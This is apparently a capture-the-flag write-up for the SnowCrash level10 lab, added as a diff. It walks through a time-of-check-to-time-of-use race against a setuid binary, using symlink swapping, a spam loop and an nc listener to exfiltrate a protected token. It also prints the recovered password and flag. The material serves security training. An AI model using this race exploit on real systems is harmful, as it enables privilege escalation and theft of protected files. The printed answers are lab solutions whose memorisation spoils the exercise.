@@ -1,0 +1,97 @@
+# in this level we have two files
+
+level10@SnowCrash:~$ ls -l
+total 16
+-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
+-rw-------  1 flag10 flag10     26 Mar  5  2016 token
+
+level10@SnowCrash:~$ ./level10
+./level10 file host
+	sends file to host if you have access to it
+
+# let's run the program with ltrace
+level10@SnowCrash:~$ ltrace ./level10 token localhost
+__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
+access("token", 4)                                                                                         = -1
+printf("You don't have access to %s\n", "token"You don't have access to token
+)                                                           = 31
++++ exited (status 31) +++
+level10@SnowCrash:~$ ltrace . token localhost
+ltrace: Can't open ELF file "/usr/local/sbin/."
+
+# from this output of ltrace, we know that the program is checking file accessibility before opening the file
+# this is an example of "Time-of-check to time-of-use race condition"
+# let's create a script that runs infinitely creating /tmp/sl => removing it => creating a symlink with the same name /tmp/sl
+# and then we'll spam ~/level10 infinitely, until we successfully have access("/tmp/sl", 4) approve (just a regular file) and we remove it and create a symlink
+# to the token file, before the program manages to open the file, as a result => the open file is ~/token
+
+# in first ssh session:
+level10@SnowCrash:~$ nc -lk 6969
+
+# in second ssh session:
+level10@SnowCrash:~$ bash /tmp/symlink_loop.sh
+
+# in third ssh session:
+level10@SnowCrash:~$ bash /tmp/spam.sh
+You don't have access to /tmp/sl
+You don't have access to /tmp/sl
+You don't have access to /tmp/sl
+You don't have access to /tmp/sl
+You don't have access to /tmp/sl
+You don't have access to /tmp/sl
+Connecting to 10.0.2.15:6969 .. Connected!
+Sending file .. wrote file!
+You don't have access to /tmp/sl
+You don't have access to /tmp/sl
+You don't have access to /tmp/sl
+You don't have access to /tmp/sl
+Connecting to 10.0.2.15:6969 .. Connected!
+Sending file .. wrote file!
+Connecting to 10.0.2.15:6969 .. Connected!
+Sending file .. Damn. Unable to open file
+
+# back to the first ssh session:
+level10@SnowCrash:~$ nc -lk 6969
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+.*( )*.
+.*( )*.
+
+
+level10@SnowCrash:~$ su flag10
+Password: 
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+flag10@SnowCrash:~$ su level11
+Password: 
+level11@SnowCrash:~$ 
+
+# level11 unlocked
